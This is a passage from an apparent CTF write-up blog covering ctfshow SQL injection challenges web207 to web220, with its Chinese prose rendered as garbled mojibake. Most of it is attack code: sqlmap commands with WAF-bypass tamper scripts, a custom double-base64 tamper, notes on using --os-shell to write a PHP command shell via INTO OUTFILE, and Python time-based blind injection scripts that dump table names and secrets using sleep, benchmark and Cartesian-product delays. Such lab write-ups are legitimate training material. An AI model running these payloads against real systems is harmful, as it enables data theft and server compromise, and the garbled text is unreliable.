9.0ä¸­ç”¨betweenæ›¿æ¢å¤§äºå·ï¼ˆ&gt;ï¼‰space2mysqldash.py      MySQLï¼ŒMSSQLæ›¿æ¢ç©ºæ ¼å­—ç¬¦ï¼ˆâ€ï¼‰ï¼ˆâ€™ â€“ â€˜ï¼‰åè·Ÿä¸€ä¸ªç ´æŠ˜å·æ³¨é‡Šä¸€ä¸ªæ–°è¡Œï¼ˆâ€™ nâ€™ï¼‰multiplespaces.py      å›´ç»•SQLå…³é”®å­—æ·»åŠ å¤šä¸ªç©ºæ ¼space2plus.py            ç”¨+æ›¿æ¢ç©ºæ ¼bluecoat.py           MySQL 5.1, SGOSä»£æ›¿ç©ºæ ¼å­—ç¬¦åä¸ä¸€ä¸ªæœ‰æ•ˆçš„éšæœºç©ºç™½å­—ç¬¦çš„SQLè¯­å¥ã€‚ ç„¶åæ›¿æ¢=ä¸ºlikenonrecursivereplacement.py      åŒé‡æŸ¥è¯¢è¯­å¥ã€‚å–ä»£predefined SQLå…³é”®å­—withè¡¨ç¤º suitable foræ›¿ä»£space2randomblank.py      ä»£æ›¿ç©ºæ ¼å­—ç¬¦ï¼ˆâ€œâ€ï¼‰ä»ä¸€ä¸ªéšæœºçš„ç©ºç™½å­—ç¬¦å¯é€‰å­—ç¬¦çš„æœ‰æ•ˆé›†sp_password.py           è¿½åŠ sp_passwordâ€™ä»DBMSæ—¥å¿—çš„è‡ªåŠ¨æ¨¡ç³Šå¤„ç†çš„26 æœ‰æ•ˆè½½è·çš„æœ«å°¾chardoubleencode.py      åŒurlç¼–ç (ä¸å¤„ç†ä»¥ç¼–ç çš„)unionalltounion.py           æ›¿æ¢UNION ALL SELECT UNION SELECTcharencode.py           Microsoft SQL Server 2005ï¼ŒMySQL 4, 5.0 and 5.5ï¼ŒOracle 10gï¼ŒPostgreSQL 8.3, 8.4, 9.0urlç¼–ç ï¼›randomcase.py           Microsoft SQL Server 2005ï¼ŒMySQL 4, 5.0 and 5.5ï¼ŒOracle 10gï¼ŒPostgreSQL 8.3, 8.4, 9.0ä¸­éšæœºå¤§å°å†™unmagicquotes.py      å®½å­—ç¬¦ç»•è¿‡ GPC addslashesrandomcomments.py      ç”¨/**/åˆ†å‰²sqlå…³é”®å­—charunicodeencode.py      ASPï¼ŒASP.NETä¸­å­—ç¬¦ä¸² unicode ç¼–ç securesphere.py       è¿½åŠ ç‰¹åˆ¶çš„å­—ç¬¦ä¸²versionedmorekeywords.py          MySQL &gt;= 5.1.13æ³¨é‡Šç»•è¿‡halfversionedmorekeywords.py      MySQL &lt; 5.1ä¸­å…³é”®å­—å‰åŠ æ³¨é‡Š</code></pre><p>è¿™é‡Œä½¿ç”¨<code>space2comment</code>è¿™ä¸ªè„šæœ¬ï¼Œç”¨<code>/**/</code>ä»£æ›¿ç©ºæ ¼</p><p><code>python sqlmap.py -u &quot;http://c58a3bf4-e4a3-491c-b0ac-f51d484f077f.challenge.ctf.show:8080/api/index.php&quot; --referer=&quot;ctf.show&quot; --data=&quot;id=1&quot; --cookie=&quot;PHPSESSID=vv1lcq36ru3v3hnu9qsk4mllub&quot; --method=&quot;PUT&quot; -headers=&quot;Content-Type:text/plain&quot; --safe-url=&quot;http://c58a3bf4-e4a3-491c-b0ac-f51d484f077f.challenge.ctf.show:8080/api/getToken.php&quot; --safe-freq=1 --tamper=space2comment.py --dump</code></p><h1 id="web208"><a href="#web208" class="headerlink" title="web208"></a>web208</h1><pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">//å¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡Œäº†è¿‡æ»¤</span><span class="token comment" spellcheck="true">// $id = str_replace('select', '', $id);</span>  <span class="token keyword">function</span> <span class="token function">waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">{</span>   <span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/ /'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿‡æ»¤å…³é”®è¯ï¼Œå¯ä»¥<strong>å¤§å°å†™</strong>ç»•è¿‡ï¼Œç”¨åˆ°<code>randomcase.py</code>ï¼ŒåŒæ—¶<code>space2comment.py</code>ä¹Ÿå¾—ç”¨ä¸Š<code>--tamper=randomcase.py,space2comment.py</code></p><h1 id="web209"><a href="#web209" class="headerlink" title="web209"></a>web209</h1><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210812191229483.png" alt="image-20210812191229483"></p><p>è¿™é‡Œæ˜¯åˆ©ç”¨çš„/**/æ¥ä»£æ›¿çš„ç©ºæ ¼ï¼Œä½†æ˜¯æ­¤é¢˜è¢«wafæŒ¡ä½äº†ï¼Œæˆ‘ä»¬æ¢%0aï¼Œ%09éƒ½å¯ä»¥<code>--tamper=&quot;tamper/space2comment.py&quot;</code></p><p>ç„¶åé’ˆå¯¹=çš„è¿‡æ»¤ï¼Œéœ€è¦æ·»åŠ ä»¥ä¸‹å†…å®¹ï¼š</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'='</span><span class="token punctuation">:</span>                retVal <span class="token operator">+=</span> chr<span class="token punctuation">(</span><span class="token number">0x0d</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'like'</span><span class="token operator">+</span>chr<span class="token punctuation">(</span><span class="token number">0x0d</span><span class="token punctuation">)</span>                <span class="token keyword">continue</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h1 id="web210-212"><a href="#web210-212" class="headerlink" title="web210-212"></a>web210-212</h1><p><strong>è¿”å›é€»è¾‘</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">//å¯¹æŸ¥è¯¢å­—ç¬¦è¿›è¡Œè§£å¯†</span>  <span class="token keyword">function</span> <span class="token function">decode</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token function">strrev</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token function">strrev</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/ |\*/'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¯¹ä½ è¾“å…¥çš„idæœ‰è§£å¯†å¤„ç†ï¼Œæ‰€ä»¥éœ€è¦è‡ªè¡ŒåŠ å¯†ï¼ŒåŒæ—¶å¯¹è¿”å›å€¼è¿‡æ»¤ç©ºæ ¼*å·ï¼Œéœ€è¦ç”¨%09æ¥ä»£æ›¿å³å¯</p><p><code>--tamper=web212</code>å³å¯</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210812221751652.png" alt></p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>compat <span class="token keyword">import</span> xrange<span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>enums <span class="token keyword">import</span> PRIORITY<span class="token keyword">import</span> base64__priority__ <span class="token operator">=</span> PRIORITY<span class="token punctuation">.</span>LOW<span class="token keyword">def</span> <span class="token function">tamper</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> space2comment<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    retVal <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">if</span> payload<span class="token punctuation">:</span>        retVal <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>payload<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        retVal <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>retVal<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> retVal<span class="token keyword">def</span> <span class="token function">space2comment</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>    retVal <span class="token operator">=</span> payload    <span class="token keyword">if</span> payload<span class="token punctuation">:</span>        retVal <span class="token operator">=</span> <span class="token string">""</span>        quote<span class="token punctuation">,</span> doublequote<span class="token punctuation">,</span> firstspace <span class="token operator">=</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">False</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> xrange<span class="token punctuation">(</span>len<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token operator">not</span> firstspace<span class="token punctuation">:</span>                <span class="token keyword">if</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>isspace<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    firstspace <span class="token operator">=</span> <span class="token boolean">True</span>                    retVal <span class="token operator">+=</span> chr<span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">)</span>                    <span class="token keyword">continue</span>            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'\''</span><span class="token punctuation">:</span>                quote <span class="token operator">=</span> <span class="token operator">not</span> quote            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'"'</span><span class="token punctuation">:</span>                doublequote <span class="token operator">=</span> <span class="token operator">not</span> doublequote            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"*"</span><span class="token punctuation">:</span>                retVal <span class="token operator">+=</span> chr<span class="token punctuation">(</span><span class="token number">0x31</span><span class="token punctuation">)</span>                <span class="token keyword">continue</span>            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"="</span><span class="token punctuation">:</span>                retVal <span class="token operator">+=</span> chr<span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'like'</span><span class="token operator">+</span>chr<span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">)</span>                <span class="token keyword">continue</span>            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">" "</span> <span class="token operator">and</span> <span class="token operator">not</span> doublequote <span class="token operator">and</span> <span class="token operator">not</span> quote<span class="token punctuation">:</span>                retVal <span class="token operator">+=</span> chr<span class="token punctuation">(</span><span class="token number">0x0a</span><span class="token punctuation">)</span>                <span class="token keyword">continue</span>            retVal <span class="token operator">+=</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    <span class="token keyword">return</span> retVal<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="web213â€”â€”os-shell"><a href="#web213â€”â€”os-shell" class="headerlink" title="web213â€”â€”os-shell"></a>web213â€”â€”os-shell</h1><pre class="line-numbers language-php"><code class="language-php">ç»ƒä¹ ä½¿ç”¨<span class="token operator">--</span>os<span class="token operator">-</span>shell ä¸€é”®getshell<span class="token comment" spellcheck="true">//å¯¹æŸ¥è¯¢å­—ç¬¦è¿›è¡Œè§£å¯†</span>  <span class="token keyword">function</span> <span class="token function">decode</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token function">strrev</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token function">strrev</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/ |\*/'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>åŸç†å¤§è‡´æ˜¯ï¼š</strong><br>ç”¨into outfileå‡½æ•°å°†ä¸€ä¸ªå¯ä»¥ç”¨æ¥ä¸Šä¼ çš„phpæ–‡ä»¶å†™åˆ°ç½‘ç«™çš„æ ¹ç›®å½•ä¸‹ï¼Œä¹‹åå†ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶ï¼Œè¿™ä¸ªæ–‡ä»¶å¯ä»¥ç”¨æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œå¹¶ä¸”å°†ç»“æœè¿”å›å‡ºæ¥</p><p><strong>os-shellçš„ä½¿ç”¨æ¡ä»¶</strong><br>ï¼ˆ1ï¼‰ç½‘ç«™å¿…é¡»æ˜¯rootæƒé™<br>ï¼ˆ2ï¼‰æ”»å‡»è€…éœ€è¦çŸ¥é“ç½‘ç«™çš„ç»å¯¹è·¯å¾„<br>ï¼ˆ3ï¼‰GPCä¸ºoffï¼Œphpä¸»åŠ¨è½¬ä¹‰çš„åŠŸèƒ½å…³é—­</p><h1 id="web214"><a href="#web214" class="headerlink" title="web214"></a>web214</h1><p>æœ‰ä¸¤ä¸ªpostæ³¨å…¥ç‚¹ï¼šip&amp;debug</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span><span class="token comment" spellcheck="true"># @Author  : Yn8rt</span><span class="token comment" spellcheck="true"># @Time    : 2021/8/13 20:01</span><span class="token comment" spellcheck="true"># @Function:</span><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://42ef38fd-35c5-4cb5-ae0a-658cbd6d58e2.challenge.ctf.show:8080/api/"</span>flag <span class="token operator">=</span> <span class="token string">""</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    i <span class="token operator">+=</span> <span class="token number">1</span>    head <span class="token operator">=</span> <span class="token number">32</span>    tail <span class="token operator">=</span> <span class="token number">127</span>    <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>        <span class="token comment" spellcheck="true"># æŸ¥åº“å</span>        payload <span class="token operator">=</span> <span class="token string">"database()"</span>        <span class="token comment" spellcheck="true"># æŸ¥è¡¨åå­—</span>        <span class="token comment" spellcheck="true"># payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span>        <span class="token comment" spellcheck="true"># æŸ¥åˆ—åå­—-id.flag</span>        <span class="token comment" spellcheck="true"># payload = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagx'"</span>        <span class="token comment" spellcheck="true"># æŸ¥æ•°æ®</span>        <span class="token comment" spellcheck="true"># payload = "select flaga from ctfshow_flagx"</span>        data <span class="token operator">=</span> <span class="token punctuation">{</span>            <span class="token string">'ip'</span><span class="token punctuation">:</span> f<span class="token string">"if(ascii(substr(({payload}),{i},1))>{mid},sleep(1.5),1)"</span><span class="token punctuation">,</span>            <span class="token string">'debug'</span><span class="token punctuation">:</span><span class="token string">'0'</span>        <span class="token punctuation">}</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>            tail <span class="token operator">=</span> mid        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>        flag <span class="token operator">+=</span> chr<span class="token punctuation">(</span>head<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">break</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="web215"><a href="#web215" class="headerlink" title="web215"></a>web215</h1><p>é—­åˆå•å¼•å·å³å¯ï¼š</p><pre class="line-numbers language-python"><code class="language-python">data <span class="token operator">=</span> <span class="token punctuation">{</span>            <span class="token string">'ip'</span><span class="token punctuation">:</span> f<span class="token string">"1' or if(ascii(substr(({payload}),{i},1))>{mid},sleep(1.5),1) and '1'='1"</span><span class="token punctuation">,</span>            <span class="token string">'debug'</span><span class="token punctuation">:</span><span class="token string">'0'</span>        <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h1 id="web216"><a href="#web216" class="headerlink" title="web216"></a>web216</h1><p><strong>æŸ¥è¯¢è¯­å¥</strong></p><pre class="line-numbers language-php"><code class="language-php">       where id <span class="token operator">=</span> <span class="token function">from_base64</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>éœ€è¦é—­åˆ</strong></p><pre class="line-numbers language-python"><code class="language-python">data <span class="token operator">=</span> <span class="token punctuation">{</span>            <span class="token string">'ip'</span><span class="token punctuation">:</span> f<span class="token string">"'MQ==') or if(ascii(substr(({payload}),{i},1))>{mid},sleep(1.5),1"</span><span class="token punctuation">,</span>            <span class="token string">'debug'</span><span class="token punctuation">:</span><span class="token string">'0'</span>        <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>æœ€ç»ˆæ ¼å¼</strong></p><pre class="line-numbers language-php"><code class="language-php">where id <span class="token operator">=</span> <span class="token function">from_base64</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">ascii</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">{</span>payload<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">{</span>i<span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token punctuation">{</span>mid<span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1.5</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="web217"><a href="#web217" class="headerlink" title="web217"></a>web217</h1><p>å…³äºbenchmarkå‡½æ•°ï¼Œä»–ä¼šé€ æˆä¸€ä¸ªç®€å•çš„æ—¶é—´å»¶è¿Ÿï¼ŒåŒæ—¶ç½‘ä¸Šè¿˜æµä¼ åˆ©ç”¨benchmarkå‡½æ•°è¿›è¡Œddosæ”»å‡»ï¼Œæ˜¯æƒ³è®©æ•°æ®åº“è¶…è´Ÿè·ï¼Œä¹Ÿç®—æ˜¯æ¯”è¾ƒæ–°é²œçš„ä¸€ä¸ªå‡½æ•°ï¼Œæ¯”è¾ƒå¥½ç†è§£</p><p><strong><a href="https://blog.csdn.net/weixin_36276175/article/details/113295236" target="_blank" rel="noopener">MySQLä¸­benchmark_MYSQLä¸­BENCHMARKå‡½æ•°çš„åˆ©ç”¨</a></strong></p><p><strong>å…³é”®è¯­å¥</strong></p><pre class="line-numbers language-python"><code class="language-python">data <span class="token operator">=</span> <span class="token punctuation">{</span>            <span class="token string">'ip'</span><span class="token punctuation">:</span> f<span class="token string">"1) or if(ascii(substr(({payload}),{i},1))>{mid},benchmark(100000,md5(1)),1"</span><span class="token punctuation">,</span>            <span class="token string">'debug'</span><span class="token punctuation">:</span><span class="token string">'0'</span>        <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h1 id="web218"><a href="#web218" class="headerlink" title="web218"></a>web218</h1><p><a href="https://www.cnblogs.com/forforever/p/13019703.html" target="_blank" rel="noopener">MySQLæ—¶é—´ç›²æ³¨äº”ç§å»¶æ—¶æ–¹æ³•</a></p><pre class="line-numbers language-mysql"><code class="language-mysql"> ç¬›å¡å°”ç§¯ï¼ˆå¤šè¡¨è”åˆæŸ¥è¯¢ï¼‰(å› ä¸ºè¿æ¥è¡¨æ˜¯ä¸€ä¸ªå¾ˆè€—æ—¶çš„æ“ä½œ)     AxB=Aå’ŒBä¸­æ¯ä¸ªå…ƒç´ çš„ç»„åˆæ‰€ç»„æˆçš„é›†åˆï¼Œå°±æ˜¯è¿æ¥è¡¨     SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C;     select * from table_name A, table_name B     select * from table_name A, table_name Bï¼Œtable_name C     select count(*) from table_name A, table_name Bï¼Œtable_name C  è¡¨å¯ä»¥æ˜¯åŒä¸€å¼ è¡¨<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>é‡ç‚¹åœ¨å¾ˆè€—æ—¶ï¼Œæ‰€ä»¥è¯´å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹ç‰¹æ€§ï¼Œå°†å¤šè¡¨è”åˆæŸ¥è¯¢æ”¾åœ¨åŸæ¥sleepçš„ä½ç½®ï¼Œå°±å¯ä»¥åŒæ ·æœ‰ç¡çœ çš„æ•ˆæœ</p><p><strong>è„šæœ¬</strong></p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> sys<span class="token keyword">import</span> timeurl<span class="token operator">=</span><span class="token string">"http://6b39c9d3-3c24-432b-abfd-735534f0e5cf.challenge.ctf.show:8080/api/"</span>letter<span class="token operator">=</span><span class="token string">"0123456789abcdefghijklmnopqrstuvwxyz-,{_}"</span> <span class="token comment" spellcheck="true">#æœ€åè·‘flagæ—¶å»æ‰"_"</span>flag<span class="token operator">=</span><span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> letter<span class="token punctuation">:</span>        <span class="token comment" spellcheck="true">#payload="1) or if((select group_concat(table_name) from information_schema.tables where table_schema=database()) like '{}%',(select count(*) from information_schema.columns A, information_schema.columns B),0)-- -".format(flag+j)</span>        <span class="token comment" spellcheck="true">#payload="1) or if((select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagxc') like '{}%',(select count(*) from information_schema.columns A, information_schema.columns B),0) -- +".format(flag+j)</span>        payload<span class="token operator">=</span><span class="token string">"1) or if((select group_concat(flagaac) from ctfshow_flagxc) like '{}%',(select count(*) from information_schema.columns A, information_schema.columns B),0)-- -"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>flag<span class="token operator">+</span>j<span class="token punctuation">)</span>        data<span class="token operator">=</span><span class="token punctuation">{</span>                 <span class="token string">'ip'</span><span class="token punctuation">:</span>payload<span class="token punctuation">,</span>            <span class="token string">'debug'</span><span class="token punctuation">:</span><span class="token number">0</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">#print(res)</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">0.15</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text        <span class="token keyword">except</span><span class="token punctuation">:</span>            flag<span class="token operator">+=</span>j            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>             <span class="token keyword">break</span>              <span class="token keyword">if</span> <span class="token string">"}"</span> <span class="token operator">==</span> j<span class="token punctuation">:</span>            sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.2</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#éå†letterä¸­ä¸€ä¸ªå­—ç¬¦å°±åœæ­¢0.2s      </span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.2</span><span class="token punctuation">)</span>     <span class="token comment" spellcheck="true">#æ­£ç¡®åŒ¹é…åˆ°ä¸€ä¸ªå­—ç¬¦å°±åœæ­¢1s</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="web219-web220"><a href="#web219-web220" class="headerlink" title="web219-web220"></a>web219-web220</h1><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> sys<span class="token keyword">import</span> timeurl<span class="token operator">=</span><span class="token string">"/api/index.php"</span>letter<span class="token operator">=</span><span class="token string">"0123456789abcdefghijklmnopqrstuvwxyz-,{}"</span> <span class="token comment" spellcheck="true">#æœ€åè·‘flagæ—¶å»æ‰"_"</span>flag<span class="token operator">=</span><span class="token string">"ctfshow{45835205-bd93-40ff-9d71-"</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> letter<span class="token punctuation">:</span>                <span class="token comment" spellcheck="true">#payload="1) or if((table_name from information_schema.tables where table_schema=database() limit 0,1) like '{}%',(SELECT count(*) FROM information_schema.tables A, information_schema.schemata B, information_schema.schemata D, information_schema.schemata E, information_schema.schemata F,information_schema.schemata G, information_schema.schemata H,information_schema.schemata I),1)-- -".format(flag+j)</span>        <span class="token comment" spellcheck="true">#payload="1) or if((select column_name from information_schema.columns where table_name='ctfshow_flagxcac') like '{}%',(SELECT count(*) FROM information_schema.tables A, information_schema.schemata B, information_schema.schemata D, information_schema.schemata E, information_schema.schemata F,information_schema.schemata G, information_schema.schemata H,information_schema.schemata I),0) -- +".format(flag+j)</span>        payload<span class="token operator">=</span><span class="token string">"1) or if((select flagaabcc from ctfshow_flagxcac) like '{}%',(SELECT count(*) FROM information_schema.columns A, information_schema.columns B),1)-- -"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>flag<span class="token operator">+</span>j<span class="token punctuation">)</span>        data<span class="token operator">=</span><span class="token punctuation">{</span>                 <span class="token string">'ip'</span><span class="token punctuation">:</span>payload<span class="token punctuation">,</span>             <span class="token 